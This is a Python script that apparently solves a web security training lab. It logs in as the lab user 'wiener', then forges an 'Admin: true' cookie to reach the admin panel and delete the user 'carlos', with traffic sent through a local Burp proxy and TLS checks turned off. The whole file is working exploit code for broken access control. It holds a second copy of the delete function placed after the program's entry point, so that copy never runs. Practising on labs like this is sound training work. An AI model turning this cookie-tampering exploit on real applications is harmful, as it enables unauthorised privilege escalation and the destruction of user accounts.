import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https':'https://127.0.0.1:8080'}

def get_csrf_token(s, url):
    try: 
        r = s.get(url, verify=False, proxies=proxies) #verify=false because we dont want to verify tls certificates and proxy to pass through burp
        r.raise_for_status()  # Raise an error for HTTP status codes indicating failure
        soup = BeautifulSoup(r.text, 'html.parser')
        csrf = soup.find("input", {'name': 'csrf'})['value'] #cause this was in the input element, basically a find function
        print(csrf)
        return csrf
    except (requests.RequestException, KeyError) as e:
        print("Error getting CSRF token:", e)
        return None



def delete_user(s, url):
    # this is the logic for deleting the users
    # get CSRF token for the login page
    login_url = url + "/login"
    csrf_token = get_csrf_token(s, login_url)

    #login as wiener peter
    data = {"csrf": csrf_token,
    "username": "wiener",
    "password": "peter"}

    r = s.post(login_url, data=data, verify=False, proxies=proxies)
    res = r.text
    if "Log out" in res:
        print("(+) Successfully logged in as wiener peter.")

        #retrieve the session cookie
        my_account_url = url + "/my-account"
        r = s.get(my_account_url, verify=False, proxies=proxies)
        session_cookie = s.cookies.get_dict().get('session') #saves the cookie in a variable

        # Visit the admin panel and delete the user carlos
        delete_carlos_user_url = url + "/admin/delete?username=carlos"
        cookies = {'Admin': 'true', 'session': session_cookie}
        r = requests.get(delete_carlos_user_url, cookies=cookies, verify=False, proxies=proxies)
        if r.status_code == 200:
            print('(+) Successfully deleted Carlos user.')
        else:
            print('(-) Failed to delete Carlos user.')
            sys.exit(-1)

    else:
        print("(-) Failed to login as the wiener user.")
        sys.exit(-1)


def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]
    delete_user(s, url)

if __name__ == "__main__":
    main()


def delete_user(s, url):
    try:
        login_url = url + "/login"
        csrf_token = get_csrf_token(s, login_url)

        if not csrf_token:
            raise ValueError("CSRF token not found or retrieval failed.")

        data = {"csrf": csrf_token, "username": "wiener", "password": "peter"}

        r = s.post(login_url, data=data, verify=False, proxies=proxies)
        r.raise_for_status()  # Raise an error for HTTP status codes indicating failure

        res = r.text
        if "Log out" in res:
            print("(+) Successfully logged in as wiener peter.")

            my_account_url = url + "/my-account"
            r = s.get(my_account_url, verify=False, proxies=proxies)
            r.raise_for_status()

            session_cookie = s.cookies.get_dict().get('session')

            delete_carlos_user_url = url + "/admin/delete?username=carlos"
            cookies = {'Admin': 'true', 'session': session_cookie}
            r = s.get(delete_carlos_user_url, cookies=cookies, verify=False, proxies=proxies)
            r.raise_for_status()

            print('(+) Successfully deleted Carlos user.')
        else:
            raise RuntimeError("Failed to login as the wiener user.")
    except (requests.RequestException, KeyError, ValueError, RuntimeError) as e:
        print("Error:", e)
        sys.exit(-1)

